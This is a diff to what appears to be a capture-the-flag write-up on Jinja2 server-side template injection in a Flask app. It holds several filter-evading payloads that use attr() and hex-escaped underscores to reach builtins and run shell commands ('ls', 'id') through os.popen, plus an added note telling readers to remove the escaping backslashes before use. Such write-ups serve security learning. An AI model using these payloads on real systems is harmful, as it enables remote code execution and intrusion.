@@ -327,11 +327,13 @@ To bypass these filters, I needed a way to access object attributes without usin
     The `request` object is often available in Flask templates and can be used as a starting point to reach the `application` and its `globals`.
 
 Combining these techniques, I could craft a payloads that avoided all detections:
-`{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')}}`
+`\{\{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')\}\}`
 
-`{{lipsum|attr('\x5f\x5fglobals\x5f\x5f')|attr('get')('os')|attr('popen')('ls')|attr('read')()}}`
+`\{\{lipsum|attr('\x5f\x5fglobals\x5f\x5f')|attr('get')('os')|attr('popen')('ls')|attr('read')()\}\}`
 
-`{{self|attr('\x5fTemplateReference\x5f\x5fcontext')|attr('get')('cycler')|attr('\x5f\x5finit\x5f\x5f')|attr('\x5f\x5fglobals\x5f\x5f')|attr('get')('os')|attr('popen')('id')|attr('read')()}}`
+`\{\{self|attr('\x5fTemplateReference\x5f\x5fcontext')|attr('get')('cycler')|attr('\x5f\x5finit\x5f\x5f')|attr('\x5f\x5fglobals\x5f\x5f')|attr('get')('os')|attr('popen')('id')|attr('read')()\}\}`
+
+**Note:** You must remove the backslash (`\`) from the payloads when using them; it was added here only to avoid rendering issues in the browser.
 
 * * *
 
@@ -341,7 +343,7 @@ Now that I could access `builtins`, I could import the `os` module to achieve **
 
 **RCE Payload (to list files):**
 ```jinja2
-{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('ls')|attr('read')()}}
+\{\{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('ls')|attr('read')()\}\}
 ```
 
 ![RCE](https://raw.githubusercontent.com/AbdelruhmanAskar/0/refs/heads/master/assets/images/D0tless%20Pr1s0n/Rce.png)
